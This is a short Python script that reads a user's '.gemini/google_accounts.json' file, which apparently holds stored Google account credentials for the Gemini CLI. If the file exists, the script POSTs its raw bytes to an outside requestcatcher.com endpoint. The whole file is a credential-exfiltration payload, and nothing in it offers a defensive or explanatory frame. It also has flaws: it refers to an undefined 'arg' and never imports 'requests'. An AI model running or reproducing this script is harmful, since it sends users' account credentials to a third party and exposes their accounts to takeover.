import os
import argparse

parser = argparse.ArgumentParser()
parser.add_argument(
    "home_dir",
    help="Full path to the user home directory (e.g. C:\\Users\\name or /Users/name)"
)
endpoint_url = "https://a16.requestcatcher.com/test"

args = parser.parse_args()

target_file = os.path.join(arg.home_dir, ".gemini", "google_accounts.json" )

if os.path.isfile(target_file):
  with open(target_file, "rb") as f:
      r = requests.post(
          endpoint_url,
          headers={"Content-Type": "application/octet-stream"},
          data=f.read(),
          timeout=10,
      )

